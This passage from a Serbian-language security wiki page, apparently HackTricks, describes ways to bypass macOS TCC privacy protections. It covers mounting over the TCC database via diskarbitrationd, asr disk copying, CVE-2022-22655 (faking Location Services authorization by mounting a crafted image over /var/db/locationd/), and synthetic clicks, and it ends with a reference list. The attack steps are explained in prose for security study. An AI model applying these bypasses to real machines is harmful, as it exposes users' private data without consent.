To je napadaču omogućilo proizvoljno montiranje na bilo koju lokaciju, uključujući i preko TCC baze podataka, zahvaljujući entitlement-u `com.apple.private.security.storage-exempt.heritable` koji ima `diskarbitrationd`.

### asr

Alat **`/usr/sbin/asr`** omogućavao je kopiranje celog diska i njegovo montiranje na drugu lokaciju, zaobilazeći TCC zaštite.

### CVE-2022-22655 - Usluge lokacije

Usluge lokacije se **ne** čuvaju u TCC bazi podataka kao ostale usluge. Njima upravlja `locationd`, koji održava sopstvenu listu dozvoljenih u **`/var/db/locationd/clients.plist`**:<sup>[[4]](#references)</sup>

```bash
# Requires FDA to read
sudo plutil -p /var/db/locationd/clients.plist | head -40
```

Svaki unos je indeksiran prema klijentu (bundle ID ili putanja do izvršne datoteke) i sadrži polja kao što su `Authorized`, `BundleId`, `Executable` i `Registered`.<sup>[[4]](#references)</sup>

Sama datoteka `clients.plist` zaštićena je pomoću Sandbox/TCC i ne može se menjati čak ni kao root — ali **direktorijum `/var/db/locationd/` nije bio zaštićen od montiranja**. Zato je napadač koji ima root privilegije mogao da napravi sliku diska koja sadrži njegovu `clients.plist` datoteku (u kojoj je njegov binarni fajl označen kao `Authorized`), montira je preko direktorijuma i ponovo pokrene `locationd` kako bi lažna lista dozvoljenih stupila na snagu.<sup>[[3]](#references)</sup>

> [!TIP]
> Ovo je isti obrazac kao kod prethodno navedenih TCC zaobilaženja pomoću `hdiutil`/`mount`: *datoteka* je zaštićena, ali *direktorijum u kom se nalazi* nije, pa se zato zamenjuje ceo direktorijum umesto datoteke.

## Preko aplikacija za pokretanje


{{#ref}}
../../../../macos-auto-start-locations.md
{{#endref}}

## Pomoću grep-a

U više navrata datoteke čuvaju osetljive informacije kao što su imejl adrese, brojevi telefona, poruke... na nezaštićenim lokacijama (što Apple smatra ranjivošću).

<figure><img src="../../../../../images/image (474).png" alt=""><figcaption></figcaption></figure>

## Synthetic Clicks

Ovo više ne funkcioniše, ali [**nekada jeste**](https://twitter.com/noarfromspace/status/639125916233416704/photo/1)**:**

<figure><img src="../../../../../images/image (29).png" alt=""><figcaption></figcaption></figure>

Drugi način pomoću [**CoreGraphics događaja**](https://objectivebythesea.org/v2/talks/OBTS_v2_Wardle.pdf):<sup>[[17]](#references)</sup>

<figure><img src="../../../../../images/image (30).png" alt="" width="563"><figcaption></figcaption></figure>



## References

- [1] [CVE-2020–9934: Zaobilaženje macOS okvira Transparency, Consent, and Control (TCC)](https://medium.com/@mattshockl/cve-2020-9934-bypassing-the-os-x-transparency-consent-and-control-tcc-framework-for-4e14806f1de8)
- [2] [Slučajno i namerno zaobilaženje macOS TCC zaštite privatnosti korisnika](https://www.sentinelone.com/labs/bypassing-macos-tcc-user-privacy-protections-by-accident-and-design/)
- [3] [CVE-2022-22655 - Zaobilaženje TCC zaštite Location Services (izvorni izveštaj)](https://theevilbit.github.io/posts/cve-2022-22655/)
- [4] [Gde je Carmen Sandiego: zloupotreba Location Services u macOS-u](https://slyd0g.medium.com/where-in-the-world-is-carmen-sandiego-abusing-location-services-on-macos-10e9f4eefb71)
- [5] [Jamf Threat Labs - CVE-2024-44131: Zaobilaženje TCC-a krade podatke iz iCloud-a](https://www.jamf.com/blog/tcc-bypass-steals-data-from-icloud/)
- [6] [SQLite - `test_sqllog.c` (SQLITE_ENABLE_SQLLOG promenljive okruženja)](https://github.com/sqlite/sqlite/blob/master/src/test_sqllog.c)
- [7] [Apple - Entitlement za dozvolu DYLD promenljivih okruženja](https://developer.apple.com/documentation/bundleresources/entitlements/com.apple.security.cs.allow-dyld-environment-variables)
- [8] [The Eclectic Light Company - Notarizacija: hardened runtime](https://eclecticlight.co/2021/01/07/notarization-the-hardened-runtime/)
- [9] [U XCSSET malware-u otkriveno zero-day zaobilaženje TCC-a](https://www.jamf.com/blog/zero-day-tcc-bypass-discovered-in-xcsset-malware/)
- [10] [OBTS v5.0: „Šta se desi na vašem Mac-u, ostaje u Apple-ovom iCloud-u?!” - Wojciech Regula](https://www.youtube.com/watch?v=_6e2LhmxVc0)
- [11] [Nova ranjivost u macOS-u, „powerdir”, mogla bi da omogući neovlašćen pristup korisničkim podacima](https://www.microsoft.com/en-us/security/blog/2022/01/10/new-macos-vulnerability-powerdir-could-lead-to-unauthorized-user-data-access/)
- [12] [Promena matičnog direktorijuma i zaobilaženje TCC-a, poznato i kao CVE-2020-27937](https://wojciechregula.blog/post/change-home-directory-and-bypass-tcc-aka-cve-2020-27937/)
- [13] [Puštanje muzike i zaobilaženje TCC-a, poznato i kao CVE-2020-29621](https://wojciechregula.blog/post/play-the-music-and-bypass-tcc-aka-cve-2020-29621/)
- [14] [Kako opljačkati (Fire)fox](https://wojciechregula.blog/post/how-to-rob-a-firefox/)
- [15] [CVE-2023-26818 - Zaobilaženje TCC-a pomoću Telegram-a u macOS-u](https://danrevah.github.io/2023/05/15/CVE-2023-26818-Bypass-TCC-with-Telegram/)
- [16] [Kandji - Otkrivanje ranjivosti u Apple sistemima: revizija diskarbitrationd i storagekitd, 2. deo](https://www.kandji.io/blog/macos-audit-story-part2)
- [17] [Patrick Wardle - Objective by the Sea v2.0: Synthetic Clicks i CoreGraphics Event Taps](https://objectivebythesea.org/v2/talks/OBTS_v2_Wardle.pdf)
- [18] [breakpointHQ/TCC-ClickJacking - Dokaz koncepta](https://github.com/breakpointHQ/TCC-ClickJacking)
- [19] [Stack Overflow - Podešavanje promenljivih okruženja u OS X-u](https://stackoverflow.com/questions/135688/setting-environment-variables-on-os-x/3756686#3756686)
- [20] [theevilbit - CVE-2020-9771: zaobilaženje TCC-a i eskalacija privilegija pomoću mount_apfs](https://theevilbit.github.io/posts/cve_2020_9771/)
- [21] [theevilbit - CVE-2021-30808: zaobilaženje TCC-a montiranjem preko TCC baze podataka](https://theevilbit.github.io/posts/cve-2021-30808/)
- [22] [Više od 20 načina za zaobilaženje mehanizama privatnosti u macOS-u](https://www.youtube.com/watch?v=W9GxnP8c8FU)
- [23] [Ubedljiva pobeda nad TCC-om - Više od 20 novih načina za zaobilaženje mehanizama privatnosti u macOS-u](https://www.youtube.com/watch?v=a9hsxPdRxsY)
- [24] [Od Spotlight-a do Apple Intelligence-a — zloupotreba 0day ranjivosti za krađu podataka koji pokreću macOS AI](https://objective-see.org/blog/blog_0x81.html)
{{#include ../../../../../banners/hacktricks-training.md}}
